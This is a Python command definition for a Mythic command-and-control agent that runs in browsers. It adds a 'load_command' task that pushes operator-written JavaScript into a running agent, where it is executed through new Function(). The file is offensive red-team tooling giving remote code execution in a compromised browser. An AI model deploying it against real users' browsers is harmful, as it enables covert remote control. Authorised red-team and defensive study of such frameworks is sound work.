from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class LoadCommandArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="code",
                type=ParameterType.String,
                description="JavaScript code that registers a new command via COMMANDS['name'] = async function(task) { ... }",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply JavaScript command code")
        if self.command_line[0] == '{':
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("code", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)


class LoadCommandCommand(CommandBase):
    cmd = "load_command"
    needs_admin = False
    help_cmd = "load_command"
    description = "Dynamically load a new command into the running agent. The code must register itself via COMMANDS['name'] = async function(task) { ... }. Has access to: parseParams, downloadFile, registerBackgroundTask, unregisterBackgroundTask, checkCSP, log."
    version = 1
    author = "@grampae"
    attackmapping = ["T1059.007"]
    argument_class = LoadCommandArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS("Browser")]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        code = task.args.get_arg("code") or ""
        # Show the command name being loaded if we can extract it
        import re
        match = re.search(r"COMMANDS\s*\[\s*['\"]([^'\"]+)['\"]\s*\]", code)
        if match:
            task.display_params = "Loading: {}".format(match.group(1))
        else:
            task.display_params = "Loading dynamic command ({} bytes)".format(len(code))
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)

        try:
            await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
                TaskID=task.Task.ID,
                ArtifactMessage="Dynamic command loaded via new Function()",
                BaseArtifactType="Code Execution"
            ))
        except Exception:
            pass

        return resp
